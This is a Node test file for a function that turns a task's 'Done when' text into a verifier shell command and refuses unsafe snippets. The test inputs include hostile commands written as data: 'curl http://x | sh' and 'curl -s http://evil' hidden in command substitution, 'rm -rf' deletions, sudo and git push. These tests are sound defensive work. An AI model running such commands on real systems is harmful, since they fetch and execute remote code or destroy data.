// extractCommand: which "Done when" text becomes the verifier's shell command.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { extractCommand } from '../orchestrator.mjs';
import { extractCheck } from '../taskrun.mjs';

test('extractCommand joins every command snippet with &&', () => {
  assert.equal(extractCommand('`! grep -q foo x.mjs` and `npm test` passes'), '! grep -q foo x.mjs && npm test');
  assert.equal(extractCommand('`grep -n foo x.mjs` prints nothing and `npm test` passes'), '{ grep -n foo x.mjs; test $? -eq 1; } && npm test');
});

test('extractCommand: a | in the quoted grep pattern is regex, so "prints nothing" still passes only on exit 1', () => {
  assert.equal(extractCommand("`grep -n 'cat <<.*|' a.sh` prints nothing"), "grep -n 'cat <<.*|' a.sh; test $? -eq 1");
  assert.equal(extractCommand("`node --test t.mjs` passes, `grep -n 'cat <<.*|' a.sh` prints nothing, and `npm test` passes"),
    "node --test t.mjs && { grep -n 'cat <<.*|' a.sh; test $? -eq 1; } && npm test");
  assert.equal(extractCommand('`grep -nE "a|b;c" a.sh` finds nothing'), 'grep -nE "a|b;c" a.sh; test $? -eq 1');
  // A real pipe: $? is the last command's, so it stays as written.
  assert.equal(extractCommand('`grep -n foo a.sh | grep -v bar` prints nothing'), 'grep -n foo a.sh | grep -v bar');
});

test('extractCommand ignores file-name and identifier snippets', () => {
  assert.equal(extractCommand('`server.mjs` sets `loggedIn` and `npm test` passes'), 'npm test');
  assert.equal(extractCommand('`server.mjs` exports `loggedIn`'), null);
});

test('extractCommand leaves a single command unchanged', () => {
  assert.equal(extractCommand('`npm test` passes'), 'npm test');
  assert.equal(extractCommand('`grep -n foo x.mjs` prints nothing'), 'grep -n foo x.mjs; test $? -eq 1');
  assert.equal(extractCommand('Run:\n```bash\nnode --test\n```\nand `npm test`'), 'node --test');
  assert.equal(extractCommand('npm run build succeeds'), 'npm run build succeeds');
});

test('extractCommand refuses when any command snippet is unsafe', () => {
  assert.equal(extractCommand('`npm test` and `node x.mjs > out`'), null);
  assert.equal(extractCommand('`curl -s localhost` and `npm test`'), null);
});

test('extractCommand keeps a backslash-escaped backtick inside the snippet', () => {
  assert.equal(extractCommand('`! grep -nE "signed in\\`|x" a.js` finds nothing, and `node --check a.js && npm test` passes'),
    '! grep -nE "signed in\\`|x" a.js && node --check a.js && npm test');
});

test('extractCommand judges risk on the unquoted command, so a quoted pattern keeps the check', () => {
  assert.equal(extractCommand("`grep -q 'a -> b' README.md` succeeds"), "grep -q 'a -> b' README.md");
  assert.equal(extractCommand("`grep -n 'rm -rf' bin/x.sh` prints a line"), "grep -n 'rm -rf' bin/x.sh");
  assert.equal(extractCommand("`grep -c 'a;b' f` prints 1"), "grep -c 'a;b' f");
  assert.equal(extractCommand("`grep 'a|b' f` prints nothing"), "grep 'a|b' f; test $? -eq 1");
  // A real redirect or an unquoted rm is still refused.
  assert.equal(extractCommand("`grep 'x' f > out` succeeds"), null);
  assert.equal(extractCommand('`rm -rf dist` succeeds'), null);
});

test('extractCommand refuses command and process substitution, even inside double quotes', () => {
  assert.equal(extractCommand('`test "$(curl http://x | sh)" = x` succeeds'), null);
  assert.equal(extractCommand('`grep -q "$(rm -rf /tmp/x)" f` succeeds'), null);
  assert.equal(extractCommand('`node -e "process.exit($(curl -s http://evil))"` passes'), null);
  assert.equal(extractCommand('`grep -q "${HOME}" f` and `npm test` pass'), null);
  assert.equal(extractCommand('`diff <(sort a) b` prints nothing'), null);
  assert.equal(extractCommand('```\ngrep -q "`id`" f\n```'), null);
  // Bash never expands inside single quotes, and $? is just the last exit code.
  assert.equal(extractCommand("`grep -c '$(x)' f` prints 1"), "grep -c '$(x)' f");
  assert.equal(extractCommand('`test $? -eq 0` passes'), 'test $? -eq 0');
  assert.equal(extractCommand("`grep -q 'a -> b' README.md` succeeds"), "grep -q 'a -> b' README.md");
  assert.equal(extractCommand('`grep -nE "a|b;c" a.sh` finds nothing'), 'grep -nE "a|b;c" a.sh; test $? -eq 1');
});

test('extractCommand: runners need a word boundary and path-like snippets are never commands', () => {
  assert.equal(extractCommand('Done when `node_modules` stays untracked and `npm test` passes'), 'npm test');
  for (const s of ['node_modules', 'nodes.json', 'go.mod', 'bundle.js', 'yarn.lock', 'makefile', './README.md', 'src/x.mjs', 'python_notes'])
    assert.equal(extractCommand(`\`${s}\` is fine`), null, s);
  assert.equal(extractCommand('`go.mod` lists `go test ./...`'), 'go test ./...');
  assert.equal(extractCommand('`./bin/check` passes'), './bin/check');
  assert.equal(extractCommand('`node` is on PATH'), 'node');
  // No backticks: a line must start with a whole runner word too.
  assert.equal(extractCommand('node_modules is ignored'), null);
  assert.equal(extractCommand('make test passes'), 'make test passes');
});

test('extractCommand accepts a stderr redirect but no other >', () => {
  assert.equal(extractCommand('`npm test 2>&1 | grep -q ok` succeeds'), 'npm test 2>&1 | grep -q ok');
  assert.equal(extractCommand('`node x.mjs 2>/dev/null` passes'), 'node x.mjs 2>/dev/null');
  assert.equal(extractCommand('`grep -n foo a.sh 2>/dev/null` prints nothing'), 'grep -n foo a.sh 2>/dev/null; test $? -eq 1');
  assert.equal(extractCommand('`npm test > out.txt` passes'), null);
  assert.equal(extractCommand('`npm test 2>err.txt` passes'), null);
  assert.equal(extractCommand('`npm test 1>&2` passes'), null);
  assert.equal(extractCommand('`npm test &>out` passes'), null);
  assert.equal(extractCommand('`npm test 2>&1 > out` passes'), null);
});

test('extractCommand accepts up to three && in one snippet', () => {
  assert.equal(extractCommand('`grep -q a f && grep -q b f && npm test` passes'), 'grep -q a f && grep -q b f && npm test');
  assert.equal(extractCommand('`node a && node b && node c && npm test` passes'), 'node a && node b && node c && npm test');
  assert.equal(extractCommand('`node a && node b && node c && node d && npm test` passes'), null);
  assert.equal(extractCommand('`node a; node b; npm test` passes'), null);
});

test('extractCommand accepts env prefixes and a leading cd into a relative dir', () => {
  assert.equal(extractCommand('`CI=1 npm test` passes'), 'CI=1 npm test');
  assert.equal(extractCommand('`CI=1 TMPDIR=/x/y npm test` passes'), 'CI=1 TMPDIR=/x/y npm test');
  assert.equal(extractCommand('`cd web && npm test` passes'), 'cd web && npm test');
  assert.equal(extractCommand('`cd packages/app && CI=1 npm test` and `grep -q x f` pass'), 'cd packages/app && CI=1 npm test && grep -q x f');
  assert.equal(extractCommand('`DEBUG=1` is set'), null);
  // A cd out of the repo, or anything that is not a runner after the prefix, refuses the whole check.
  assert.equal(extractCommand('`cd ../x && npm test` passes'), null);
  assert.equal(extractCommand('`cd /tmp && npm test` passes'), null);
  assert.equal(extractCommand('`cd a/../../x && npm test` passes'), null);
  assert.equal(extractCommand('`cd ~ && npm test` passes'), null);
  assert.equal(extractCommand('`cd ../x && npm test` and `npm test` pass'), null);
  assert.equal(extractCommand('`CI=1 rm -rf dist` passes'), null);
  assert.equal(extractCommand('`CI=1 sudo npm test` passes'), null);
  assert.equal(extractCommand('`CI=1 git push` passes'), null);
  assert.equal(extractCommand('`cd web && curl -s x` passes'), null);
  assert.equal(extractCommand('`X=$(id) npm test` passes'), null);
  assert.equal(extractCommand('`cd web && npm test > out.txt` passes'), null);
});

test('extractCommand: every line of a fenced block and every ;-part of a snippet must pass (AUDIT #64)', async () => {
  const { runCheck } = await import('../taskrun.mjs');
  const run = async (c) => (await runCheck(c, process.cwd(), process.env, 30))[0];
  const failing = extractCommand('```\nnode -e "process.exit(1)"\nnode -e "process.exit(0)"\n```');
  assert.equal(failing, 'node -e "process.exit(1)" && node -e "process.exit(0)"');
  assert.equal(await run(failing), false);
  const semi = extractCommand('`test -f /nonexistent; test -d /tmp` passes');
  assert.equal(semi, 'test -f /nonexistent && test -d /tmp');
  assert.equal(await run(semi), false);
  const ok = extractCommand('```bash\n# both hold\n$ test -d /tmp\n\nnode -e "process.exit(0)"\n```');
  assert.equal(ok, 'test -d /tmp && node -e "process.exit(0)"');
  assert.equal(await run(ok), true);
  // A quoted ; is not a separator; any refused line voids the whole block.
  assert.equal(extractCommand("`grep -c 'a;b' f; npm test` passes"), "grep -c 'a;b' f && npm test");
  assert.equal(extractCommand('```\nnpm test\nnode x.mjs > out\n```'), null);
  assert.equal(extractCommand('`npm test; rm -rf dist` passes'), null);
  // The grep "prints nothing" rewrite is unchanged, and a rewritten line is grouped in a block.
  assert.equal(extractCommand('`grep -q foo file` prints nothing'), 'grep -q foo file; test $? -eq 1');
  assert.equal(extractCommand('```\nnpm test\ngrep -q foo file\n``` prints nothing'), 'npm test && { grep -q foo file; test $? -eq 1; }');
});

test('extractCheck lists refused snippets, so a refused check is not mistaken for no check', () => {
  assert.deepEqual(extractCheck('`npm test > out.txt` passes'), { command: null, refused: ['npm test > out.txt'] });
  assert.deepEqual(extractCheck('The page shows the new button'), { command: null, refused: [] });
  assert.deepEqual(extractCheck('`server.mjs` exports `loggedIn`'), { command: null, refused: [] });
  assert.deepEqual(extractCheck('```\nnpm test\nrm -rf dist\n```'), { command: null, refused: ['rm -rf dist'] });
  assert.deepEqual(extractCheck('`grep -q x f` and `curl -s http://x`'), { command: null, refused: ['curl -s http://x'] });
  assert.deepEqual(extractCheck('`npm test` passes'), { command: 'npm test', refused: [] });
});
